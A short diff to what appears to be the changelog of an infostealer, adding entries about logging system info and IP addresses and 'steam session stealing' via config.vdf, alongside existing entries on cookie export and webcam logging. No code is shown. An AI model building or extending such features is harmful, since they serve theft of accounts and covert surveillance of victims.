@@ -50,6 +50,12 @@ changelog 2026-04-07:
 changelog 2026-05-02:
 - fixed cookie netscape format
 
+changelog 2026-05-20:
+- fixed system info and ip address not being logged on devices that aren't laptops
+
+changelog 2026-05-26:
+- added config.vdf for steam session stealing
+
 changelog 2026-06-29:
 - remade system info logic
 - added webcam logging
